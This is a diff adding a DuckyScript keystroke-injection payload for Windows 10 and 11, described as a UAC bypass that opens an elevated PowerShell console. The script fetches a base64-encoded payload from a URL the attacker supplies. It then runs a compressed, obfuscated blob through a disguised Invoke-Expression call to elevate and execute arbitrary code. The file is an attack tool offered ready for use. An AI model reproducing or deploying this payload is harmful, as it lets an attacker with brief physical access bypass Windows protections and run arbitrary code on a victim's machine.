@@ -1,0 +1,30 @@
+REM     Title: UrAttaControl
+REM
+REM     Author: I am Jakoby
+REM
+REM     Description: This is a UAC bypass payload that will open an elevated powershell console and run any script.
+REM     Reaplce the URL down below with a link to a base64 encoded payload you have. See README.md for more details
+REM
+REM     Target: Windows 10, 11
+REM
+REM	  NOTES: Additionally instead of pulling down your script with IWR you can hardcode the Base64 script to the $Payload variable
+REM     EXAMPLE: $Payload = "cwB0AGEAcgB0ACAAbgBvAHQAZQBwAGEAZAA="		- This Base64 script will open notepad
+REM
+REM     You can use this function I wrote to convert your .ps1 sscripts to Base64
+REM     https://github.com/I-Am-Jakoby/PowerShell-for-Hackers/blob/main/Functions/B64.md	
+REM
+GUI r
+DELAY 500
+STRING powershell 
+ENTER
+REM
+DELAY 1000
+REM
+STRING $url = "YOUR-URL-WITH-BASE64-ENCODED-SCRIPT"
+SHIFT ENTER
+STRING $Payload = (Invoke-WebRequest $url'?dl=1').Content
+SHIFT ENTER
+STRING ( nEw-obJECt Io.cOMprEssion.dEfLAtEStreAM([iO.MEMoRysTream][coNVerT]::FrOMBasE64sTring( 'hY69CsIwFEZf5RK6ph0ci1MHBZEKQacsoflahfyRRKpvb1MQnOp2h3vOd6r+fNiz4GfEdIcxNV4gDjdQdVFv45Um1kZMpPRyHU/dVQo/5llFyM6olJBk7e0kRaFlH+Dk4K1VTjNqNFWLn5rxn8ImnpDzw01Jds94Q1xpVtSs8KPXy0BALIGtyCpmLgwQiCfarXoNg4zNSPZN2f79rVmRDw=='), [SySTEM.Io.cOmprEsSION.comprEsSiOnmOdE]::DECoMPress )| ForeAch{ nEw-obJECt IO.stReaMReAdEr( $_, [SYSTEm.TEXT.encODINg]::aSciI ) } |ForEaCh { $_.rEAdtoENd() } )|& ( $VeRBosEPreFEreNcE.tosTRING()[1,3]+'x'-joIN'')
+SHIFT ENTER
+STRING exit
+ENTER
